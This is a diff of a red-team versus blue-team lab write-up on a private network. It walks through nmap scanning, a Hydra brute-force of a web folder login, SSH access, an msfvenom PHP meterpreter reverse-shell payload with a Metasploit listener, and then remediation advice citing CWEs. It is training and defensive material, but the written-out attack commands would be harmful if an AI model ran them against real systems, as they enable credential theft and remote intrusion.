@@ -32,15 +32,18 @@ Network scan to discover target IP
 `nmap -vvv 192.168.1.105`
 
 Output shows a webserver directory with interesting files listed such as *ashton* and *hannah* text files.
+
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/22.png)
 
 ## Webserver Navigation
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/7.PNG)
 
 I then find a text file that lists some new employees and their positions. One person in particuler is Ryan, the new CEO, he may have the highest level access.
+
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/23.png)
 
 Further investigation through the folders leads to a text file within the *company_folders/company_culture* path. This also mentions an interesting hidden folder I did not see earlier, titled *secret_folder*.
+
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/24.png)
 
 ## Directory Traversal
@@ -50,7 +53,8 @@ Using the new found knowledge of the existance of the *secret_folder*, I use dir
 
 ## Vulnerability Scanning
 Before launching any attacks, I wanted to perform a vulnerability scan to identify any known vulnerabilities.
-'nmap -A --script=vuln -vvv 192.168.1.105'
+
+`nmap -A --script=vuln -vvv 192.168.1.105`
 
   * Webdav vulnerability
   * SQL Injection vulnerability across all directories
@@ -62,15 +66,18 @@ Before launching any attacks, I wanted to perform a vulnerability scan to identi
 
 ## Launching Brute Force Attack
 We know that Ashton has access to the *secret_folder*, as stated when attempting to login. So I utilized the Hydra tool to launch the attack with the commonly used passwords list.
-'hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder'
+
+`hydra -l ashton -P /opt/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder`
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/10.PNG)
 
 Password has been found to be *leopoldo*
 
 ## SSH into webserver using Ashton's login info
-'ssh ashton@192.168.1.105'
- Once logged in I notice something sitting in the *home* directory.
+
+`ssh ashton@192.168.1.105`
+ 
+Once logged in I notice something sitting in the *home* directory.
  
 ### Flag1
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/28.png)
@@ -88,11 +95,13 @@ Password is *linux4u*
 
 ## Logging into WebDav with Ryan's credentials.
 Once I gained access, I notice another file of interest called *passwd.dav*.
+
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/29.png)
 
 ## Creating a Reverse Shell
 In order to create a reverse shell, I utilized msfvenom to create a payload php file containing a shell script.
-'msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php'
+
+`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 >> shell.php`
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/15.PNG)
 
@@ -101,8 +110,8 @@ I then dragged and dropped the shell.php file into the *network:///dav://192.168
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/14.PNG)
 
 ## Setting up a listener using Metasploit
-'msfconsole'
-'use multi/handler'
+`msfconsole`
+`use multi/handler`
 
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/17.PNG)
 
@@ -115,7 +124,7 @@ I switch back to Metasploit to confirm connection and that a Meterpreter session
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/19.PNG)
 
 ## Creating Interactive Shell
-'python -c 'import pty; pty.spawn("/bin/bash")'
+`python -c 'import pty; pty.spawn("/bin/bash")`
 
 ### Flag2
 ![alt text](https://github.com/rochoabanuelos/Red-Team-vs-Blue-Team-Analysis/blob/main/RED/20.PNG)
@@ -164,6 +173,7 @@ CWE-311: Missing Encryption of Sensitive Data
 https://cwe.mitre.org/data/definitions/311.html
 
 7. CWE-522: Insufficiently Protected Credentials
+
 ### Users and Passwords
 1. Usernames are employee first names.
   * These are too obvious and most likely discoverable through Google Dorking. All are high level employees of the company which are more vulnerable, and certainly easier to find in the company structure in publicly available material.
@@ -198,6 +208,7 @@ https://cwe.mitre.org/data/definitions/521.html
   * *linux4u* is a simple phrase with very common word substitution – 4=for, u=you. and leopoldo is a common name that could easily be bruteforced with a common password list.
   * Require strong passwords that exclude phrases and names, minimum 8 characters, mixed characters that include a combination of lower case, upper case, special characters and numbers.
   * Consider implementing multi-factor authentication.
+
 ### Apache 2.4.29
 1. CVE-2017-15710
   * This potential Apache httpd vulnerability was picked up by nmap and relates to a configuration that verifies user credentials; a particular header value is searched for and if it is not present in the charset conversion table, it reverts to a fallback of 2 characters (eg. en-US becomes en). While this risk is unlikely, if there is a header value of less than 2 characters, the system may crash.
